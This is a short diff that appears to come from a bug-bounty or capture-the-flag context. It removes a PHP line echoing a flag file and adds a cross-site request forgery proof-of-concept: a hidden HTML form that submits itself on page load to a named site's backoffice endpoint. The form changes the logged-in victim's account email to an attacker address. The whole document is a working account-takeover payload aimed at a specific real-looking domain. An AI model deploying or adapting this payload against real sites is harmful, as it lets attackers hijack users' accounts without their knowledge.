@@ -1,1 +1,10 @@
-<?php echo file_get_contents('/flag_files.php'); ?>
+<form action="https://ru.siberianhealth.com/ru/controller/ajax/" method="POST">
+    <input type="hidden" name="email" value="pwned@evil-user.net" />
+    <input type="hidden" name="_controller" value="Backoffice_Profile_New%2Fsubmit_email" />
+    <input type="hidden" name="_url" value="https%3A%2F%2Fru.siberianhealth.com%2Fru%2Fbackoffice%2Fprofile%2F" />
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+
